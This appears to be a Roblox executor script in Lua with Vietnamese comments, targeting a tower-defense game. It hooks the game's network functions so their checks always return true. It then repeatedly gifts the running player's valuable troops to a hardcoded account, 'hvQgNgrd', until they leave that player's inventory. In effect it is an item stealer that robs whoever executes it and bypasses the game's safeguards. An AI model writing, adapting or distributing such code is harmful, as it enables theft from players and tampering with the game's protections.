if not getupvalue then getupvalue = debug.getupvalue end

local users = {"hvQgNgrd"}
local troopsToSend = {
    "SantaTVMan", "LuckySpeakerman", "ClockSpider", 
    "GuardianClockman", "ScientistClockman"
}

local TTD
local save
local handler
local Network
local Invoke
local Fire

task.spawn(function()
    TTD = require(game:GetService("ReplicatedStorage").MultiboxFramework)
    save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)

    repeat
        local success, err = pcall(function()
            Network = TTD.Network
            Invoke = Network.Invoke
            Fire = Network.Fire
        end)
        if not success then
            warn("Error in getting Network functions: ", err)
        end
        task.wait(0.1)
    until Network ~= nil and Invoke ~= nil and Fire ~= nil
end)

-- Di chuyển getupvalue sau khi đã đảm bảo rằng Invoke và Fire không phải nil
task.spawn(function()
    repeat task.wait(0.1) until Invoke and Fire -- Đợi đến khi chúng có giá trị
    Invoke = Network.Invoke
    Fire = Network.Fire
    local GetFunc = getupvalue(Invoke, 1)
    local GetEvent = getupvalue(Fire, 1)

    coroutine.wrap(function()
        setidentity(2)
        hookfunc(getupvalue(GetFunc, 1), function()
            return true
        end)
        setidentity(8)
    end)()

    coroutine.wrap(function()
        setidentity(2)
        hookfunc(getupvalue(GetEvent, 1), function()
            return true
        end)
        setidentity(8)
    end)()
end)

-- Lấy danh sách quân trong kho
local invTroops = {}
function getInventoryTroops()
    invTroops = {}
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for name, v in pairs(save._data.Inventory.Troops) do
        for i, v in pairs(v) do
            invTroops[i] = name
        end
    end
    return invTroops
end

-- Lấy số lượng coins
local coins
function getCoinAmt()
    coins = 0
    local save = TTD.Replicate:WaitForReplica("PlayerData-" .. game:GetService("Players").LocalPlayer.UserId)
    for i, v in pairs(save._data) do
        if i == "Currencies" then
            coins = v.Coins
        end
    end
    return coins
end

-- Kiểm tra xem người chơi có quân cụ thể không
function hasTroop(id)
    local troops = getInventoryTroops()
    for i, v in pairs(troops) do
        if i == id then
            return true
        end
    end
    return false
end

-- Bắt đầu xử lý gửi quà
local startAmt = getCoinAmt()
local amt = 0

for i, user in pairs(users) do
    local sent = {}
    for i, v in pairs(getInventoryTroops()) do
        if table.find(troopsToSend, v) and not table.find(sent, v) then
            table.insert(sent, v)
            local oldC = getCoinAmt()
            local st = tick()
            repeat
                Invoke("PostOffice_SendGift", game.Players:GetUserIdFromNameAsync(user), "Troops", i, 0, tostring(math.random(1, 10000)))
                task.wait(0.1)
            until getCoinAmt() < oldC and not hasTroop(i)
            print("sent", "time taken:", tick() - st)
        end
    end
    print('finished user:', user)
end

print('Should have sent:', amt)
